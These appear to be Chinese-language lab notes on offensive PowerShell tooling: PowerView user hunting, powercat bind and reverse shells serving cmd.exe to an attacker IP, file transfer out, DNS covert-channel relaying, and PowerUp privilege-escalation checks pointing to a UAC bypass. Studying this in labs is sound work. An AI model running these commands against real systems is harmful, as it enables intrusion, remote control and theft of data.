## powerview.ps1

* 用于域中信息收集

`PowerView`脚本-`Invoke-UserHunter`

```powershell
powershell.exe -exec bypass -Command "& {Import-Module C:\PowerView.ps1;Invoke-UserHunter}" 
```

* 指定脚本路径，和使用模块



```cmd
C:\Users\administrator\Desktop>powershell.exe -exec bypass -Command "& {Import-M
odule C:\Users\administrator\Desktop\PowerView.ps1;Invoke-UserHunter}"


UserDomain   : forfun
UserName     : Administrator
ComputerName : WIN7.fun.cn
IP           : 192.168.83.182
SessionFrom  :
LocalAdmin   :

UserDomain   : forfun
UserName     : Administrator
ComputerName : DC.fun.cn
IP           : 192.168.83.181
SessionFrom  :
LocalAdmin   :
```



* 查看域用户登录记录



## powercat.ps1

下载地址：https://github.com/Emperortino/PowerShell

### 1. 加载powershell脚本

```powershell
PS C:\Users\Fun\Desktop> Import-Module .\powercat.ps1
```

当显示：

```powershell
Import-Module : 无法加载文件 C:\Users\Fun\Desktop\powercat.ps1，因为在此系统中禁止执行脚本
```

一般是策略问题，更改策略即可(需要管理员权限)：

```powershell
set-ExecutionPolicy RemoteSigned
```





```powershell
PS C:\Users\Fun\Desktop> powercat -h

powercat - Netcat, The Powershell Version
Github Repository: https://github.com/besimorhino/powercat

This script attempts to implement the features of netcat in a powershell
script. It also contains extra features such as built-in relays, execute
powershell, and a dnscat2 client.

Usage: powercat [-c or -l] [-p port] [options]

  -c  <ip>        Client Mode. Provide the IP of the system you wish to connect to.
                  If you are using -dns, specify the DNS Server to send queries to.

  -l              Listen Mode. Start a listener on the port specified by -p.

  -p  <port>      Port. The port to connect to, or the port to listen on.

  -e  <proc>      Execute. Specify the name of the process to start.

  -ep             Execute Powershell. Start a pseudo powershell session. You can
                  declare variables and execute commands, but if you try to enter
                  another shell (nslookup, netsh, cmd, etc.) the shell will hang.

  -r  <str>       Relay. Used for relaying network traffic between two nodes.
                  Client Relay Format:   -r <protocol>:<ip addr>:<port>
                  Listener Relay Format: -r <protocol>:<port>
                  DNSCat2 Relay Format:  -r dns:<dns server>:<dns port>:<domain>

  -u              UDP Mode. Send traffic over UDP. Because it's UDP, the client
                  must send data before the server can respond.

  -dns  <domain>  DNS Mode. Send traffic over the dnscat2 dns covert channel.
                  Specify the dns server to -c, the dns port to -p, and specify the
                  domain to this option, -dns. This is only a client.
                  Get the server here: https://github.com/iagox86/dnscat2

  -dnsft <int>    DNS Failure Threshold. This is how many bad packets the client can
                  recieve before exiting. Set to zero when receiving files, and set high
                  for more stability over the internet.

  -t  <int>       Timeout. The number of seconds to wait before giving up on listening or
                  connecting. Default: 60

  -i  <input>     Input. Provide data to be sent down the pipe as soon as a connection is
                  established. Used for moving files. You can provide the path to a file,
                  a byte array object, or a string. You can also pipe any of those into
                  powercat, like 'aaaaaa' | powercat -c 10.1.1.1 -p 80

  -o  <type>      Output. Specify how powercat should return information to the console.
                  Valid options are 'Bytes', 'String', or 'Host'. Default is 'Host'.

  -of <path>      Output File.  Specify the path to a file to write output to.

  -d              Disconnect. powercat will disconnect after the connection is established
                  and the input from -i is sent. Used for scanning.

  -rep            Repeater. powercat will continually restart after it is disconnected.
                  Used for setting up a persistent server.

  -g              Generate Payload.  Returns a script as a string which will execute the
                  powercat with the options you have specified. -i, -d, and -rep will not
                  be incorporated.

  -ge             Generate Encoded Payload. Does the same as -g, but returns a string which
                  can be executed in this way: powershell -E <encoded string>

  -h              Print this help message.

```





### 2. 使用

#### 1. 正向连接目标

##### 目标

```powershell
PS C:\Users\Fun\Desktop> powercat -l -p 8080 -e cmd.exe -v
详细信息: Set Stream 1: TCP
详细信息: Set Stream 2: Process
详细信息: Setting up Stream 1...
详细信息: Listening on [0.0.0.0] (port 8080)
```

* `-l` ：监听
* `-p`：端口
* `-e`：指定命令执行：一般cmd
* `-v`：显示详细信息



##### 攻击机

```powershell
root@For-Fun:~# nc 192.168.83.182 8080 -vv
192.168.83.182: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.83.182] 8080 (http-alt) open
Microsoft Windows [▒汾 6.1.7601]
▒▒Ȩ▒▒▒▒ (c) 2009 Microsoft Corporation▒▒▒▒▒▒▒▒▒▒Ȩ▒▒

C:\Windows\system32>ipconfig
ipconfig
```

* 监听目标的IP,端口，然后显示详细信息



#### 2. 目标反向连接攻击机

##### 目标

```powershell
PS C:\Users\Fun\Desktop> powercat -c 192.168.83.140 -p 8000 -v -e cmd.exe
详细信息: Set Stream 1: TCP
详细信息: Set Stream 2: Process
详细信息: Setting up Stream 1...
详细信息: Connecting...
详细信息: Connection to 192.168.83.140:8000 [tcp] succeeded!
详细信息: Setting up Stream 2...
详细信息: Starting Process cmd.exe...
详细信息: Both Communication Streams Established. Redirecting Data Between Streams...
```

* `-c`：指定建立连接的目标
* `-p`：指定端口



##### 攻击机

监听自己指定端口即可

```bash
root@For-Fun:~# nc -lvvp 8000
listening on [any] 8000 ...
192.168.83.182: inverse host lookup failed: Unknown host
connect to [192.168.83.140] from (UNKNOWN) [192.168.83.182] 49165
Microsoft Windows [▒汾 6.1.7601]
▒▒Ȩ▒▒▒▒ (c) 2009 Microsoft Corporation▒▒▒▒▒▒▒▒▒▒Ȩ▒▒

C:\Windows\system32>
```

* `-l`：监听
* `-p`：指定端口
* `-v`：显示详细信息







#### 3. 文件传输

* 前提：都导入了powercat，或者都可以使用powercat



##### 目标

```powershell
powercat -c IP -p 8080 -i c:/1.txt -v
```

* `-i`：写入文件





##### 攻击机

```powershell
powercat -l -p 8080 -of c:/test.txt -v
```

* `-of`：需要传输的文件



#### 4. powercat 实现转发

* 将内网机器给转法出来，从而让让我们可以更好访问



##### 被转发机器

```powershell
powercat -c IP(转发机器IP) -p 8080 -e cmd.exe -v
```





##### 转发机器

```powershell
powercat -l -v -p 8080 -r dns:IP(攻击机IP)::1.test
```





##### 攻击机

```bash
ruby dns2.rb 1.test -e open --no-cache
```



## powerup.ps1

* 寻找可能存在弱点的地方，从而帮助提权。

下载地址：https://github.com/Emperortino/PowerShell/





### 1. 导入

上传到目标后需要导入

```powershell
C:\Users\Fun\>powershell -exec bypass		//设置成 不会限制脚本执行：bypass

C:\Users\Fun\>cd ./desktop					//跳转到目标位置

C:\Users\Fun\Desktop> Import-Module .\PowerUp.ps1
```



### 2. 运行

* `Invoke-AllChecks`：检查所有弱点

```cmd
PS C:\Users\Fun\Desktop> Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.


[*] Checking for unquoted service paths...


[*] Checking service executable and argument permissions...


[*] Checking service permissions...


[*] Checking %PATH% for potentially hijackable .dll locations...


[*] Checking for AlwaysInstallElevated registry key...


[*] Checking for Autologon credentials in registry...


[*] Checking for vulnerable registry autoruns and configs...


[*] Checking for vulnerable schtask files/configs...


[*] Checking for unattended install files...


UnattendPath : C:\Windows\Panther\Unattend.xml





[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


PS C:\Users\Fun\Desktop>
```



### 3. 结果

然后发现：

```cmd
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.
```

提示：可以使用 bypassuac 攻击来实现提权